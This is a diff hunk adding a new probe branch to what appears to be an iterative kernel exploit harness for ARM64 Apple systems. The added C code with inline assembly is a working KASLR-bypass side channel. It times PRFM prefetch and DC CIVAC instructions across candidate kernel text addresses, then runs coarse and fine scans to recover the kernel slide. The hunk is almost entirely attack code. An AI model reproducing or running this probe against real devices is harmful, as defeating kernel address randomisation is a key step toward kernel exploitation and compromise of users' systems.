@@ -19133,6 +19133,142 @@ new_modes:
             rlog("*** Probe complete ***\n");
             goto done;
         }
+        if (rounds == 248) {
+            rlog("*** rounds=248: Prefetch timing KASLR probe ***\n");
+            
+            /* ARM64 prefetch timing approach:
+             * On some ARM64 implementations, PRFM (prefetch memory) to a mapped
+             * kernel page completes slightly faster than to an unmapped page due
+             * to TLB/cache interactions during speculative execution.
+             * 
+             * The kernel text exec base is at:
+             *   0xfffffe0007004000 + kernel_text_exec_slide
+             * 
+             * kernel_text_exec_slide is typically in range 0x30000000-0x50000000
+             * aligned to 0x4000.
+             * 
+             * We scan candidate addresses and measure prefetch timing.
+             */
+            
+            #define N_SAMPLES 100
+            #define SLIDE_MIN 0x28000000ULL
+            #define SLIDE_MAX 0x58000000ULL  
+            #define SLIDE_STEP 0x200000ULL /* 2MB steps for coarse scan */
+            
+            uint64_t base = 0xfffffe0007004000ULL;
+            
+            /* Flush our timing measurement area */
+            volatile uint64_t timing_sink = 0;
+            
+            rlog("  Scanning %llu candidate slides...\n",
+                 (SLIDE_MAX - SLIDE_MIN) / SLIDE_STEP);
+            
+            uint64_t best_addr = 0;
+            uint64_t best_time = UINT64_MAX;
+            uint64_t worst_time = 0;
+            
+            /* For each candidate slide */
+            for (uint64_t slide = SLIDE_MIN; slide < SLIDE_MAX; slide += SLIDE_STEP) {
+                uint64_t target = base + slide;
+                uint64_t total = 0;
+                
+                for (int s = 0; s < N_SAMPLES; s++) {
+                    /* Flush caches */
+                    for (volatile int i = 0; i < 100; i++) {}
+                    
+                    uint64_t t0 = mach_absolute_time();
+                    
+                    /* Attempt prefetch of kernel address */
+                    /* ARM64: PRFM PLDL1KEEP, [target] */
+                    __asm__ volatile(
+                        "prfm pldl1keep, [%0]\n"
+                        : : "r"(target) : "memory"
+                    );
+                    
+                    /* Measure time */
+                    uint64_t t1 = mach_absolute_time();
+                    total += (t1 - t0);
+                    
+                    /* Prevent optimization */
+                    timing_sink += t1;
+                }
+                
+                uint64_t avg = total / N_SAMPLES;
+                if (avg < best_time) {
+                    best_time = avg;
+                    best_addr = target;
+                }
+                if (avg > worst_time) worst_time = avg;
+            }
+            
+            rlog("  Timing range: best=%llu worst=%llu (delta=%llu)\n",
+                 best_time, worst_time, worst_time - best_time);
+            rlog("  Best candidate: 0x%016llx (slide=0x%llx) time=%llu\n",
+                 best_addr, best_addr - base, best_time);
+            
+            /* Fine-grained scan around the best candidate */
+            rlog("\n  Fine scan around best candidate...\n");
+            uint64_t fine_base = best_addr - 0x2000000ULL;
+            uint64_t fine_best_addr = 0;
+            uint64_t fine_best_time = UINT64_MAX;
+            
+            for (uint64_t addr = fine_base; addr < fine_base + 0x4000000ULL; addr += 0x4000) {
+                uint64_t total = 0;
+                for (int s = 0; s < N_SAMPLES * 2; s++) {
+                    for (volatile int i = 0; i < 50; i++) {}
+                    uint64_t t0 = mach_absolute_time();
+                    __asm__ volatile(
+                        "prfm pldl1keep, [%0]\n"
+                        : : "r"(addr) : "memory"
+                    );
+                    uint64_t t1 = mach_absolute_time();
+                    total += (t1 - t0);
+                }
+                uint64_t avg = total / (N_SAMPLES * 2);
+                if (avg < fine_best_time) {
+                    fine_best_time = avg;
+                    fine_best_addr = addr;
+                }
+            }
+            
+            rlog("  Fine best: 0x%016llx (slide=0x%llx) time=%llu\n",
+                 fine_best_addr, fine_best_addr - base, fine_best_time);
+            
+            /* Also try timing via cache flush + reload pattern */
+            rlog("\n  === Alternative: DC CIVAC timing ===\n");
+            /* Try accessing kernel addresses via data cache operations */
+            /* DC CIVAC (Clean + Invalidate by VA to PoC) is EL0 accessible */
+            uint64_t dc_best_addr = 0;
+            uint64_t dc_best_time = UINT64_MAX;
+            
+            for (uint64_t slide = SLIDE_MIN; slide < SLIDE_MAX; slide += SLIDE_STEP) {
+                uint64_t target = base + slide;
+                uint64_t total = 0;
+                
+                for (int s = 0; s < N_SAMPLES; s++) {
+                    uint64_t t0 = mach_absolute_time();
+                    __asm__ volatile(
+                        "dc civac, %0\n"
+                        "isb\n"
+                        : : "r"(target) : "memory"
+                    );
+                    uint64_t t1 = mach_absolute_time();
+                    total += (t1 - t0);
+                }
+                
+                uint64_t avg = total / N_SAMPLES;
+                if (avg < dc_best_time) {
+                    dc_best_time = avg;
+                    dc_best_addr = target;
+                }
+            }
+            
+            rlog("  DC CIVAC best: 0x%016llx (slide=0x%llx) time=%llu\n",
+                 dc_best_addr, dc_best_addr - base, dc_best_time);
+            
+            rlog("*** Probe complete ***\n");
+            goto done;
+        }
         if (rounds >= 170 && rounds != 219 && rounds != 225) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
